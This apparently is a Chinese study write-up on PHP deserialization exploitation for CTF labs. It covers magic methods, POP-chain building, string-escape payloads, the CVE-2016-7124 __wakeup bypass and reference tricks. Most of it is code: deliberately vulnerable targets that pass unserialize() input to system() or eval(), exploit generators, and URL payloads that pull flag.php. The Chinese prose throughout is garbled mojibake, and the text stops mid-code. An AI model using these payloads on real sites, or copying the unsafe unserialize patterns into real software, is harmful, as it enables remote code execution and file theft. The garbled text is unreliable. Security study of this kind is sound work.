public function __wakeup() { system($this-&gt;username); } } $user_ser = $_GET['benben']; unserialize($user_ser); ?&gt;&lt;?php class User { const SITE = 'uusama'; // å¸¸é‡ä¸å‚ä¸åºåˆ—åŒ–ï¼Œæ— éœ€å¤„ç† public $username; public $nickname; private $password; private $order; public function __construct() { $this-&gt;username = &quot;dir&quot;; $this-&gt;nickname = 'test'; $this-&gt;password = '123456'; $this-&gt;order = '001'; } } $user = new User(); $ser = serialize($user); echo &quot;\\n&quot;; echo $ser; ?&gt; tostringå’Œinvoke tostringï¼šå¸¸ç”¨æ„é€ popé“¾ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³• __callï¼šè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³• è§¦å‘æ—¶æœºï¼šè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•åŠŸèƒ½ï¼šå‚æ•°ï¼š2ä¸ªå‚æ•°ä¼ å‚$arg1,$arg2è¿”å›å€¼ï¼šè°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°å’Œå‚æ•° 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { public function __call($arg1,$arg2) { echo &quot;$arg1,$arg2[0]&quot;; }}$test = new User() ;$test -&gt; callxxx('a');?&gt;callxxx,a__callstatic è§¦å‘æ—¶æœºï¼šé™æ€è°ƒç”¨æˆ–è°ƒç”¨æˆå‘˜å¸¸é‡æ—¶ä½¿ç”¨çš„æ–¹æ³•ä¸å­˜åœ¨åŠŸèƒ½ï¼šå‚æ•°ï¼š2ä¸ªå‚æ•°ä¼ å‚$arg1,$arg2è¿”å›å€¼ï¼šè°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°å’Œå‚æ•° 123456789101112131415Warning: The magic method __callStatic() must have public visibility and be static in D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\WWW\\php_ser_Class\\class10\\2.php on line 5&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { public function __callStatic($arg1,$arg2) { echo &quot;$arg1,$arg2[0]&quot;; }}$test = new User() ;$test::callxxx('a');?&gt;callxxx,a ç‰¹æ€§ __call __callStatic è§¦å‘æ—¶æœº è°ƒç”¨å¯¹è±¡å®ä¾‹çš„éé™æ€ã€ä¸å­˜åœ¨ / ä¸å¯è®¿é—®æ–¹æ³•æ—¶è§¦å‘ è°ƒç”¨ç±»çš„é™æ€ã€ä¸å­˜åœ¨ / ä¸å¯è®¿é—®æ–¹æ³•æ—¶è§¦å‘ æ–¹æ³•ä¿®é¥°ç¬¦ å¿…é¡»æ˜¯ publicï¼ˆä¸èƒ½åŠ  staticï¼‰ å¿…é¡»æ˜¯ public staticï¼ˆå¼ºåˆ¶åŠ  staticï¼‰ è°ƒç”¨æ–¹å¼ é€šè¿‡å¯¹è±¡å®ä¾‹è°ƒç”¨ï¼ˆ$obj-&gt;xxx()ï¼‰ é€šè¿‡ç±»åè°ƒç”¨ï¼ˆClass::xxx()ï¼‰ï¼Œæˆ–å¯¹è±¡å®ä¾‹é™æ€è°ƒç”¨ï¼ˆä¸æ¨èï¼‰ ä¸Šä¸‹æ–‡ æ‹¥æœ‰å¯¹è±¡ä¸Šä¸‹æ–‡ï¼ˆå¯è®¿é—® $thisï¼‰ æ— å¯¹è±¡ä¸Šä¸‹æ–‡ï¼ˆä¸å¯è®¿é—® $thisï¼Œä»…èƒ½è®¿é—®é™æ€å±æ€§ / æ–¹æ³•ï¼‰ è¯­æ³•è¦æ±‚ æ—  static ä¿®é¥°ï¼Œå¦åˆ™æŠ¥é”™ å¿…é¡»åŠ  static ä¿®é¥°ï¼Œå¦åˆ™æŠ¥é”™ __GET()è§¦å‘æ—¶æœºï¼šè°ƒç”¨çš„æˆå‘˜å±æ€§ä¸å­˜åœ¨åŠŸèƒ½ï¼šå‚æ•°ï¼šä¼ å‚$arg1è¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§° 123456789101112131415161718192021222324252627282930&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { public $var1; public function __get($arg1) { echo $arg1; }}$test = new User() ;$test -&gt;var2;?&gt;# var2&lt;?php class User { public $var1=&quot;benben&quot;; public function __get($arg1) { echo $arg1; } } $test = new User() ; $test -&gt;var1; echo $test -&gt;var1; ?&gt;# benbenè¿™é‡Œå°±æ²¡æœ‰è°ƒç”¨GET __set()è§¦å‘æ—¶æœºï¼šç»™ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§èµ‹å€¼åŠŸèƒ½ï¼šå‚æ•°ï¼šä¼ å‚$arg1,$arg2è¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§°å’Œèµ‹çš„å€¼ 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { public $var1; public function __set($arg1 ,$arg2) { echo $arg1.','.$arg2; }}$test = new User() ;$test -&gt;var2=1;?&gt;# var2,1 1__isset() è§¦å‘æ—¶æœºï¼šå¯¹ä¸å¯è®¿é—®å±æ€§ä½¿ç”¨isset()æˆ–empty(0æ—¶ï¼Œisset0ä¼šè¢«è°ƒç”¨ã€‚åŠŸèƒ½ï¼šå‚æ•°ï¼šä¼ å‚5arg1è¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§° isset()ç”¨çš„æˆå‘˜å±æ€§varä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨ 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { private $var; public function __isset($arg1 ) { echo $arg1; }}$test = new User() ;isset($test-&gt;var);?&gt;# var __unset()è§¦å‘æ—¶æœºï¼šå¯¹ä¸å¯è®¿é—®å±æ€§ä½¿ç”¨unset()æ—¶åŠŸèƒ½å‚æ•°ï¼šä¼ å‚Sarg1è¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§° 12345678910111213141516&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { private $var; public function __unset($arg1 ) { echo $arg1; }}$test = new User() ;unset($test-&gt;var);?&gt;# var# è¿”å›ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§° __invoke()ï¼šæŠŠå¯¹è±¡å½“æˆå‡½æ•°è°ƒç”¨ __clone()è§¦å‘æ—¶æœºï¼šå½“ä½¿ç”¨cloneå…³é”®å­—æ‹·è´å®Œæˆä¸€ä¸ªå¯¹è±¡åï¼Œæ–°å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³•clone()åŠŸèƒ½ï¼šå‚æ•°ï¼šè¿”å›å€¼ï¼š 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { private $var; public function __clone( ) { echo &quot;__clone test&quot;; }}$test = new User() ;$newclass = clone($test)?&gt;# __clone test # å…ˆnewäº†ä¸€ä¸ªUserç„¶åæŠŠå¤‡ä»½ç»™newclassï¼Œä¼šè‡ªåŠ¨è§¦å‘ popé“¾å‰ç½®12345678910111213141516171819202122232425&lt;?phphighlight_file(__FILE__);error_reporting(0);class index { private $test; public function __construct(){ $this-&gt;test = new normal(); } public function __destruct(){ $this-&gt;test-&gt;action(); }}class normal { public function action(){ echo &quot;please attack me&quot;; }}class evil { var $test2; public function action(){ eval($this-&gt;test2); }}unserialize($_GET['test']);?&gt; åæ¨æ³• 123456åˆ©ç”¨ç‚¹eval($this-&gt;test2);actionè‚¯å®šä¸ä¼šè¢«å‡­ç©ºæ‰§è¡Œæ‰¾è°ƒç”¨actiondestructè°ƒç”¨äº†action å®šä¹‰testæ˜¯ä¸€ä¸ªå¯¹è±¡å¹¶ä¸”å®ƒé‡Œé¢çš„å€¼æ˜¯obj evilååºåˆ—åŒ–ä¸ä¼šè°ƒç”¨constructå®ä¾‹åŒ–çš„æ—¶å€™æ‰ä¼šè°ƒç”¨contruct exp 1234567891011121314151617181920212223242526&lt;?php class index { private $test; public function __construct(){ $this-&gt;test = new evil(); } // public function __destruct(){ // $this-&gt;test-&gt;action(); // } } //class normal { // public function action(){ // echo &quot;please attack me&quot;; // } //} class evil { var $test2=&quot;phpinfo();&quot;; // public function action(){ // eval($this-&gt;test2); // } } $a=new index(); echo serialize($a); echo &quot;\\n&quot;; echo urlencode(serialize($a)); ?&gt; å¦ä¸€ç§æ„é€ æ–¹æ³•åœ¨ç±»å¤–èµ‹å€¼ 1234567891011121314151617&lt;?phpclass index { private $test;}class evil { var $test2;}$a=new evil();$a-&gt;test2=&quot;phpinfo();&quot;;$b=new index();$b-&gt;test2=$a;echo &quot;\\n&quot;;echo serialize($b);echo &quot;\\n&quot;;echo urlencode(serialize($b)); é­”æœ¯&amp;POPå‰ç½®12345678910111213141516171819&lt;?phphighlight_file(__FILE__);error_reporting(0);class fast { public $source; public function __wakeup(){ echo &quot;wakeup is here!!&quot;; echo $this-&gt;source; }}class sec { var $benben; public function __tostring(){ echo &quot;tostring is here!!&quot;; }}$b = $_GET['benben'];unserialize($b);?&gt; 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);error_reporting(0);class fast { public $source; public function __wakeup(){ echo &quot;wakeup is here!!&quot;; echo $this-&gt;source; }}class sec { var $benben; public function __tostring(){ echo &quot;tostring is here!!&quot;; }}$b = $_GET['benben'];unserialize($b);?&gt; 123456789101112131415161718'O:3:&quot;sec&quot;:1:{s:6:&quot;benben&quot;;N;}'&lt;?php class fast { public $source; } class sec { var $benben; } $a=new sec(); //ç»™sourceè¦ä¸€ä¸ªsecç±»ï¼Œå› ä¸ºè¦è°ƒç”¨tostringæ–¹æ³• $b=new fast(); $b-&gt;source=$a; echo serialize($b); ?&gt;O:4:&quot;fast&quot;:1:{s:6:&quot;source&quot;;O:3:&quot;sec&quot;:1:{s:6:&quot;benben&quot;;N;}} tostringè°ƒç”¨æˆåŠŸ POPé“¾æ„é€ &amp;POCçš„ç¼–å†™åœ¨ååºåˆ—åŒ–ä¸­ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„æ•°æ®å°±æ˜¯å¯¹è±¡ä¸­çš„å±æ€§å€¼ï¼ˆæˆå‘˜å˜é‡ï¼‰ï¼Œæ‰€ä»¥åœ¨PHPååºåˆ—åŒ–ä¸­æœ‰ä¸€ç§æ¼æ´åˆ©ç”¨æ–¹æ³•å«â€é¢å‘å±æ€§ç¼–ç¨‹â€ï¼Œå³PoP(Property Oriented Programming)ã€‚POPé“¾å°±æ˜¯åˆ©ç”¨é­”æ³•æ–¹æ³•åœ¨é‡Œé¢è¿›è¡Œå¤šæ¬¡è·³è½¬ç„¶åè·å–æ•æ„Ÿæ•°æ®çš„ï¼Œä¸€ç§payloadã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php//flag is in flag.phphighlight_file(__FILE__);error_reporting(0);class Modifier { private $var; public function append($value) { include($value); echo $flag; } public function __invoke(){ $this-&gt;append($this-&gt;var);//è¦è°ƒç”¨Modifier,æ‰èƒ½append }}class Show{ public $source;//èµ‹Showç±» public $str;//èµ‹Testç±» public function __toString(){ // è®¿é—® Test å¯¹è±¡çš„ source å±æ€§ return $this-&gt;str-&gt;source;//è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œä¼šè§¦å‘ __get()é­”æœ¯æ–¹æ³•ï¼Œsourceå±æ€§åœ¨Tesç±»ä¸­æ˜¯ä¸å­˜åœ¨çš„ } public function __wakeup(){//ååºåˆ—åŒ–ä¼šè‡ªåŠ¨è§¦å‘ echo $this-&gt;source;//ç»™sourceèµ‹Showç±»ï¼Œæ‰èƒ½è§¦å‘toString }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p; return $function(); }}if(isset($_GET['pop'])){ unserialize($_GET['pop']);}?&gt;ç›®æ ‡æ˜¯echo $flagå€’æ¨æ³•éœ€è¦æ‰¾include($value);æ˜¯å“ªé‡Œçš„ï¼Ÿå‚æ•°ä¼ è¿›æ¥çš„valueçš„å€¼=flag.php,æ‰å¯ä»¥è¾“å‡ºflaginvokeè°ƒç”¨äº†appendï¼Œæƒ³åŠæ³•ä¿®æ”¹$this-&gt;varä¸ºflag.phpå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚é‚£ä¸ªåœ°æ–¹èƒ½å¤Ÿè¾“å‡ºå‘¢ï¼Ÿreturn $function(); function()æ˜¯ä¸€ä¸ªpï¼Œä¿®æ”¹pp=Modefilerï¼Œè°ƒç”¨è§¦å‘getæ–¹æ³•æ‰èƒ½è¿›è¡Œä¸‹é¢çš„æ“ä½œgetè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ç»™$strèµ‹å€¼ä¸ºå¯¹è±¡Testï¼Œè€ŒTestä¸­ä¸å­˜åœ¨æˆå‘˜å±æ€§sourceï¼Œåˆ™å¯ä»¥è§¦å‘Testé‡Œçš„æˆå‘˜æ–¹æ³•getwakeupèµ‹å€¼ä¸ºå¯¹è±¡Showï¼Œå½“echoæ—¶ä¼šè°ƒç”¨toString ä¸‹é¢æ˜¯å€’æ¨ 12345678910111213141516171819202122232425262728293031323334unserialize() â†’ Show::__wakeup() â†’ echoå¯¹è±¡ â†’ Show::__toString() â†’ è®¿é—®ä¸å­˜åœ¨çš„å±æ€§ â†’ Test::__get() â†’ è°ƒç”¨å¯¹è±¡ä½œä¸ºå‡½æ•° â†’ Modifier::__invoke() â†’ Modifier::append() â†’ include('flag.php')Showå¯¹è±¡ (source â†’ å¼•ç”¨#1) â†“ sourceå±æ€§ â†’ æŒ‡å‘Showå¯¹è±¡è‡ªèº« (r:1) strå±æ€§ â†’ Testå¯¹è±¡ â†“ på±æ€§ â†’ Modifierå¯¹è±¡ â†“ varå±æ€§ â†’ &quot;flag.php&quot;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:{s:13:&quot; Modifier var&quot;;s:8:&quot;flag.php&quot;;}}}&lt;?php//flag is in flag.phpclass Modifier { private $var='flag.php';}class Show{ public $source;//ç»™sourceèµ‹Showç±»ï¼Œæ‰èƒ½è§¦å‘toString public $str;//èµ‹Testç±»ï¼Œè°ƒç”¨Testå¯¹è±¡ä½œä¸ºå‡½æ•°è§¦å‘GETæ–¹æ³•}class Test{ public $p;//èµ‹å€¼Modifierç±»}$mod=new Modifier();$test=new Test();$test-&gt;p=$mod;$show=new Show();$show-&gt;source=$show;$show-&gt;str=$test;echo serialize($show);echo &quot;\\n&quot;;echo urlencode(serialize($show));?&gt; å­—ç¬¦ä¸²é€ƒé€¸&amp;å­—ç¬¦ä¸²å‡å°‘â€“åŸºç¡€ååºåˆ—åŒ–ä»¥;}ç»“æŸï¼Œåé¢çš„å­—ç¬¦ä¸²ä¸å½±å“æ­£å¸¸çš„ååºåˆ—åŒ– å±æ€§é€ƒé€¸ ä¸€èˆ¬åœ¨æ•°æ®å…ˆç»è¿‡ä¸€æ¬¡serializeå†ç»è¿‡unserialize,åœ¨è¿™ä¸ªä¸­é—´ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²å˜å¤šæˆ–è€…å˜å°‘çš„æ—¶å€™æœ‰å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–å±æ€§é€ƒé€¸ã€‚ 123456789&lt;?phpclass A{ public $v1=&quot;a&quot;;}echo serialize(new A());// O:1:&quot;A&quot;:1:{s:2:&quot;v1&quot;;s:1:&quot;a&quot;;}$b='O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;s:1:&quot;a&quot;;s:2:&quot;v3&quot;;s:3:&quot;ben&quot;;}';var_dump(unserialize($b)); 1$b='O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;s:1:&quot;a&quot;;s:2:&quot;v3&quot;;s:3:&quot;ben&quot;;}'; $b=â€™O:1:â€Aâ€:1:{s:2:â€v1â€;s:1:â€aâ€;s:2:â€v3â€;s:3:â€benâ€;}â€™; è¿”å›bool(false)ä¸èƒ½ååºåˆ—åŒ– 123456789101112131415161718192021222324252627&lt;?php class A{ public $v1=&quot;a1&quot;; public $v2=&quot;dazhuang&quot;; public $v3=&quot;sssss&quot;; } echo serialize(new A()); // O:1:&quot;A&quot;:1:{s:2:&quot;v1&quot;;s:1:&quot;a&quot;;} $b='O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;s:3:&quot;a88&quot;;s:2:&quot;v3&quot;;s:3:&quot;ben&quot;;}'; //v2ä»Aç±»è·å¾—çš„var_dump(unserialize($b));O:1:&quot;A&quot;:3:{s:2:&quot;v1&quot;;s:2:&quot;a1&quot;;s:2:&quot;v2&quot;;s:8:&quot;dazhuang&quot;;s:2:&quot;v3&quot;;s:5:&quot;sssss&quot;;}class A#1 (3) { public $v1 =&gt; string(3) &quot;a88&quot; public $v2 =&gt; string(8) &quot;dazhuang&quot; public $v3 =&gt; string(3) &quot;ben&quot;} ä¸‹é¢å°±å»é€ƒé€¸ç›®æ ‡ï¼šé€ƒé€¸å‡ºæ¥ä¸€ä¸ªv3ï¼Œå€¼ä¸º123 ä¸‹é¢è¿™æ®µä»£ç æ˜¯ä¸æˆåŠŸçš„ä»£ç å› ä¸ºæŠŠsystem()åˆ æ‰äº† 12345678910&lt;?php class A{ public $v1 = &quot;abcsystem()&quot;; public $v2 = '123'; } $data = serialize(new A()); $data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);//å‡ºç°system()å°±åˆ æ‰ var_dump(unserialize($data));//å¾—åˆ°abc ?&gt; å­—ç¬¦ä¸²é€ƒé€¸ 123456ååºåˆ—åŒ–å­—ç¬¦ä¸²å‡å°‘é€ƒé€¸ï¼Œå¤šé€ƒé€¸å‡ºä¸€ä¸ªæˆå‘˜å±æ€§ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å‡å°‘ï¼Œåƒæ‰æœ‰æ•ˆä»£ç ï¼Œåœ¨ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ„é€ ä»£ç ååºåˆ—åŒ–å­—ç¬¦ä¸²å¢å¤šé€ƒé€¸ï¼šæ„é€ ä¸€ä¸ªé€ƒé€¸æˆå‘˜å±æ€§ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å¢å¤šï¼Œåå‡ºå¤šä½™ä»£ç ï¼ŒæŠŠå¤šä½™ä»£ç æ„é€ æˆé€ƒé€¸çš„æˆå‘˜å±æ€§ åŒå¼•å·æ˜¯æ ¼å¼ç¬¦å·è¿˜æ˜¯å­—ç¬¦ä¸²é•¿åº¦3æ¥åˆ¤æ–­çš„ 1$b='O:1' æˆå‘˜å±æ€§æ•°é‡ä¸€è‡´æˆå‘˜å±æ€§åç§°é•¿åº¦ä¸€è‡´ï¼Œå†…å®¹é•¿åº¦ä¸€è‡´ 1O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;s:11:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;} ä¿®æ”¹v2çš„å€¼å½¢æˆ123çš„é€ƒé€¸æŠŠå‰é¢çš„å€¼å…¨åƒäº†ç»¿è‰²å˜æˆåŠŸèƒ½æ€§ä»£ç  é€ƒé€¸ä»£ç  1234567891011&lt;?php class A{ public $v1 = &quot;abcsystem()system()system()&quot;; public $v2 = '1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;}'; } $data = serialize(new A()); $data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);//å‡ºç°system()å°±åˆ æ‰ var_dump(unserialize($data));//å¾—åˆ°abc ?&gt; å­—ç¬¦ä¸²é€ƒé€¸-å¢å¤š 22ä¸ªlså 4422ä¸ªpwdå 66 1lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;} å­—ç¬¦ä¸²é€ƒé€¸æˆä»£ç  1åˆ¤æ–­pass=='escaping' å­—ç¬¦ä¸²é€ƒé€¸å¢åŠ ä¾‹é¢˜1234567891011121314151617181920212223242526272829&lt;?php highlight_file(__FILE__); error_reporting(0); function filter($name){ $safe=array(&quot;flag&quot;,&quot;php&quot;); $name=str_replace($safe,&quot;hack&quot;,$name); return $name;//éœ€è¦è¿”å›escaping } class test{ var $user; var $pass='daydream'; function __construct($user){ $this-&gt;user=$user; } } $param=$_GET['param']; $param=serialize(new test($param));//new test($param)è§¦å‘contructï¼Œwakeup $profile=unserialize(filter($param));//è¿‡æ»¤flagå’Œphpï¼Œç„¶åååºåˆ—åŒ– if ($profile-&gt;pass=='escaping'){ echo file_get_contents(&quot;flag.php&quot;); } ?&gt;ç”¨æˆ·è¾“å…¥(GET param) â†’ ä¼ å…¥testç±»çš„æ„é€ æ–¹æ³•ï¼Œå®ä¾‹åŒ–testå¯¹è±¡ â†’ åºåˆ—åŒ–è¯¥testå¯¹è±¡ï¼ˆå¾—åˆ°å«é»˜è®¤pass=daydreamçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼‰â†’ filterå‡½æ•°è¿‡æ»¤åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ˆæ›¿æ¢flag/phpä¸ºhackï¼‰â†’ ååºåˆ—åŒ–è¿‡æ»¤åçš„å­—ç¬¦ä¸²ï¼ˆå¾—åˆ°$profileå¯¹è±¡ï¼‰â†’ æ£€æŸ¥$profile-&gt;passæ˜¯å¦ç­‰äº'escaping' â†’ æ»¡è¶³åˆ™è¯»å–flag.php æ€ä¹ˆåˆ¤æ–­æ˜¯å¢åŠ çš„ï¼Ÿ 123456789ä»phpåˆ°hackæ˜¯å¢åŠ çš„ï¼Œæ‰€ä»¥æ˜¯å¢åŠ çš„&lt;?php class test{ var $user='benben'; var $pass='escaping'; } echo serialize(new test()); ?&gt; å¾—åˆ° 1O:4:&quot;test&quot;:2:{s:4:&quot;user&quot;;s:4:&quot;hack&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;} ç„¶åæ„é€ é€ƒé€¸ 1O:4:&quot;test&quot;:2:{s:4:&quot;user&quot;;s:4:&quot;hack&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;} è¦é€ƒé€¸escapingç›®æ ‡é€ƒé€¸ä»£ç phpè¢«æ›¿æ¢æˆhackéœ€è¦åå‡º27ä¸ªå­—ç¬¦ï¼Œç„¶åéœ€è¦è¡¥å…¨ç»“æ„ï¼Œæ‰€ä»¥éœ€è¦åå‡º29ä¸ªå­—ç¬¦ 1user=&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;} å†™29ä¸ªphpä¸ºä»€ä¹ˆï¼Œä¸€ä¸ªphpåå‡ºä¸€ä¸ªå­—ç¬¦ï¼Œè¦29ä¸ªphp 1?param=&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;} æŸ¥çœ‹æºç å¾—åˆ°flag å­—ç¬¦ä¸²é€ƒé€¸å‡å°‘ä¾‹é¢˜123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($name){ $safe=array(&quot;flag&quot;,&quot;php&quot;); $name=str_replace($safe,&quot;hk&quot;,$name); return $name;}class test{ var $user; var $pass; var $vip = false ; function __construct($user,$pass){ $this-&gt;user=$user; $this-&gt;pass=$pass; }}$param=$_GET['user'];$pass=$_GET['pass'];$param=serialize(new test($param,$pass));$profile=unserialize(filter($param));if ($profile-&gt;vip){ echo file_get_contents(&quot;flag.php&quot;);}?&gt;å†™é¢˜æµç¨‹1.å­—ç¬¦ä¸²è¿‡æ»¤åæ˜¯å‡å°‘è¿˜æ˜¯å¢å¤š flagï¼Œphpæ˜æ˜¾æ¯”hké•¿æ‰€ä»¥æ˜¯å‡å°‘2.æ„é€ å…³é”®æˆå‘˜å±æ€§åºåˆ—åŒ–å­—ç¬¦ä¸² $vip=true3.å˜å°‘åˆ™åˆ¤æ–­åƒæ‰çš„å†…å®¹ï¼Œå¹¶è®¡ç®—é•¿åº¦&lt;?php class test { var $user = &quot;flag&quot;; var $pass = &quot;benben&quot;; var $vip = true; } echo serialize(new test()); ?&gt;O:4:&quot;test&quot;:3:{s:4:&quot;user&quot;;s:4:&quot;flag&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;} æ„é€ å‡å°‘å­—ç¬¦ä¸²é€ƒé€¸ ä¿ç•™ 1&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;} æœ€ç»ˆé€ƒé€¸ 1;s:3:&quot;vip&quot;;b:1;} è¦ç®—åƒæ‰é‚£ä¸€éƒ¨åˆ† 123456789101112131415161718192021222324&lt;?phpfunction filter($name){ $safe=array(&quot;flag&quot;,&quot;php&quot;); $name=str_replace($safe,&quot;hk&quot;,$name); return $name;}class test{ var $user; var $pass; var $vip = false ; function __construct($user,$pass){ $this-&gt;user=$user; $this-&gt;pass=$pass; }}$param='flagflagflagflagflagflagflagflagflagflag';$pass='1&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;}';$param=serialize(new test($param,$pass));$profile=unserialize(filter($param));if ($profile-&gt;vip){ echo file_get_contents(&quot;flag.php&quot;);}?&gt; weakupé­”æœ¯æ–¹æ³•ç»•è¿‡ä¸€èˆ¬ä¸å•ç‹¬å‡º 1__wakeup() CVE-2016-7124ååºåˆ—åŒ– å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å£°æ˜çš„å±æ€§æ•°é‡å¤§äºå®é™…å®é™…ç±»ä¸­å®šä¹‰çš„å±æ€§æ•°é‡å¤šæ—¶ï¼Œ__wakeup()æ–¹æ³•ä¼šè¢«è·³è¿‡ã€‚PHP5&lt;5.6.25PHP7&lt;7.0.10 1O:4:&quot;test&quot; 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); class secret{ var $file='index.php'; public function __construct($file){ $this-&gt;file=$file; } function __destruct(){ include_once($this-&gt;file); echo $flag; } function __wakeup(){ $this-&gt;file='index.php'; } } $cmd=$_GET['cmd']; if (!isset($cmd)){ highlight_file(__FILE__); } else{ if (preg_match('/[oc]:\\d+:/i',$cmd)){ echo &quot;Are you daydreaming?&quot;; } else{ unserialize($cmd); } } //sercet in flag.php ?&gt; 1234567891011O:+6:&quot;sercet&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}&lt;?phpclass secret{ var $file = 'flag.php';}//echo serialize(new secret());//O:6:&quot;secret&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}$a='O:+6:&quot;secret&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}';echo urlencode($a); ä¸æ˜¾ç¤ºflagæˆ‘è¿˜ä»¥ä¸ºæˆ‘è„šæœ¬å†™é”™ å¼•ç”¨1234567891011121314151617181920212223242526&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun { var $enter; var $secret;}if (isset($_GET['pass'])) { $pass = $_GET['pass']; $pass=str_replace('*','\\*',$pass);}$o = unserialize($pass);if ($o) { $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$flag; else echo &quot;Oh no... You can't fool me&quot;;}else echo &quot;are you trolling?&quot;;?&gt;Congratulation! Here is my secret: ctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7} 1234567891011&lt;?php class just4fun { var $enter; var $secret; } $a=new just4fun(); $a -&gt;enter = &amp;$a -&gt;secret; echo serialize($a); ?&gt;O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;} Rä»£è¡¨å¼•ç”¨ï¼Œ2ä»£è¡¨enterç±»ä¼¼ä¸€ä¸ªå¿«æ·æ–¹å¼ 1?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;} sessionååºåˆ—åŒ–å½“seesion_start()è¢«è°ƒç”¨æˆ–è€…php.iniä¸­session.auto_startä¸º1æ—¶PHPå†…éƒ¨è°ƒç”¨ä¼šè¯ç®¡ç†å™¨ï¼Œè®¿é—®ç”¨æˆ·sessionè¢«åºåˆ—åŒ–ä»¥åï¼Œå­˜å‚¨åˆ°æŒ‡å®šç›®å½•ï¼ˆé»˜è®¤ä¸º/tmp)ã€‚ å­˜å–æ•°æ®çš„æ ¼å¼æœ‰å¤šç§ï¼Œå¸¸ç”¨çš„æœ‰ä¸‰ç§æ¼æ´çš„äº§ç”Ÿï¼šå†™å…¥å’Œè¯»å–çš„æ ¼å¼ä¸ä¸€æ · 1benben|s:6:&quot;1234565&quot;; php_serializeåºåˆ—åŒ– 1234&lt;?phpsession_start();$_SESSION['benben']=$_GET['ben'];?&gt; æ¼æ´æ˜¯æ€ä¹ˆæ¥çš„? 1åªè¦æœ‰ä¸€ä¸ªç±»ä¸ºD å®ƒçš„å€¼å°±å¯ä»¥ä¸ºåºåˆ—åŒ– php 1234567&lt;?php class 